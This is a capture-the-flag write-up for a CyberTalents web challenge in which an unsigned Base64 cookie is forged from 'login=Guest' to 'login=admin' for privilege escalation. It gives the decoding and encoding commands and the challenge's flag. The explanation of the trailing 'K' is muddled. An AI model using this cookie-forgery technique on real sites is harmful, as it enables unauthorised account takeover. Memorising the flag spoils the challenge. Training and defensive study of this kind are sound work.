# CyberTalents – Web Security Challenge Writeup


**Category:** Web Security  
**Level:** Easy  
**Points:** 50  
**Link:** [http://cdlem86dv92kb4zlgrndvjyytevy4w93xnjq4i7vr-web.cybertalentslabs.com](http://cdlem86dv92kb4zlgrndvjyytevy4w93xnjq4i7vr-web.cybertalentslabs.com/)

---

## 1. Description

> _Do not start a fight you cannot stop._

The challenge involves weak authentication and poor cookie validation. The goal is to escalate from **Guest** to **admin** by manipulating encoded cookies.

---

## 2. Initial Enumeration

1. Open the website.
    
2. Inspect the page _(Ctrl + Shift + C)_.
    
3. Scroll down — you will find credentials:
    

```
Guest Account:
-----------------
Username: Guest
Password: Guest
```

4. Log in using these credentials.
    

---

## 3. Cookie Analysis

After login, inspect cookies (via **Cookie-Editor** or **Burp Suite**).  
You will see:

```
Authentication=bG9naW49R3Vlc3Q%3D
```

This is URL‑encoded + Base64.

### Step 1 — URL Decode

`%3D` → `=`

```
bG9naW49R3Vlc3Q=
```

### Step 2 — Base64 Decode

Using Linux:

```
echo "bG9naW49R3Vlc3Q=" | base64 -d
```

Output:

```
login=Guest
```

This confirms the value stored inside the cookie.

---

## 4. Privilege Escalation

Goal: change **Guest** → **admin**.

### Step 1 — Create new value

```
echo "login=admin" | base64
```

Output:

```
bG9naW49YWRtaW4K
```

Notice: original challenge removes the trailing `K` when storing cookies.

So we remove it and add `=` for URL‑encoding compatibility:

```
bG9naW49YWRtaW4=
```

Then URL‑encode:

```
bG9naW49YWRtaW4%3D
```

### Step 2 — Replace the cookie

Set the website cookie:

```
Authentication=bG9naW49YWRtaW4%3D
```

Reload the page.

You will receive the **admin password** or directly the flag.

---

## 5. Flag

```
Flag{B@D_4uTh1Nt1C4Ti0n}
```

---

## 6. Lessons Learned

- Never rely on client-side cookies for authentication.
    
- Base64 ≠ encryption — it is reversible.
    
- Authentication tokens must be signed or encrypted.
    
- URL encoding + Base64 can easily be manipulated by attackers.
    

---

